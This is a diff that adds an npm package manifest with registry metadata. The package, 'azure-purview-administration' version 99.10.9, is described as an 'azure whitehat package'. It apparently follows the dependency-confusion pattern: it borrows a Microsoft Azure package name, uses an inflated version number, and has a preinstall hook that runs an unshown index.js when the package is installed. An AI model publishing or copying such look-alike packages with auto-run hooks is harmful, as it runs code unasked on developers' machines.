@@ -1,0 +1,39 @@
+{
+    "name": "azure-purview-administration",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-purview-administration@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-E2VPSfSf159I5NFSrL4xU4ykHhsactSPIsNG9VxBclD8OeAjAICk7TQlbqTmCO5ZUr+3sh6MjnjtLKNIqVJhHg==",
+        "shasum": "7ffbfcf5f695297f42e1f239778595a21d3d3e27",
+        "tarball": "https://registry.npmjs.org/azure-purview-administration/-/azure-purview-administration-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3592,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSumCRA9TVsSAnZWagAAW0oP/j+7OcNLMSzYzTRsv/Yl\nW7tDH4TdT382CXIzeYOyxcC88MJaJZvoi1B6+GGELKOZq6hA9/toEo+dg+vQ\nvQq5CcuVwP7IWB7ZilR4jiUWSDvs2uyq+ywtQOjfcnMwOFepoP406VY1gsLr\neSNxS+ohKTMkmBTu8VuPQsFWYehrNikQO30WRTcPNZ7IfLFKH31ZDT+mLU0c\nisnNyUzwIbtMYkx1r4wFkpkgaHaXmhZXxe07hs0DlZ1V4qPf1e2k+AGlf7rN\npmWep4rnRR9thOZ8pj60ee/pK93prQFlGK9DhqH9KTkb9+8d23nxduqmPOgZ\nOt//HMIUE1j6Bz8lnKvEZxmQRvd7DHtt396yykC75z5BkGqruIzJ1+e9L+Ls\nfDb2eRd1Y5SUCYBL8xPxjtC6NM0sB1/vZz6wswRNORAxndNrVw+mwbCXbXSm\nLbu17qNsFvklOOVFAmmTqAOhgcLOM+qfWPVmlQLNDWIi1HD5n5QNlBCYRDNu\n2YqtsiOLjzrgR5Whf5zCVVwonbNMBUX6nS1agcY8XDnd8+sSFHkXfWZ3v9qi\nEmLiCePYAEhDoIQvMHxfUMfktf3/h7S24puJ049zj1oquwQmwo3/MhlTzkvb\n8J051YaPFrZE6iNRJSko3hoiLo9U+cbOVjc6cUPEbJi3imCIkZ+Bpw0eIZq5\nRTeo\r\n=0HNV\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-purview-administration_99.10.9_1637952422695_0.9413460166277037"
+    },
+    "_hasShrinkwrap": false
+}
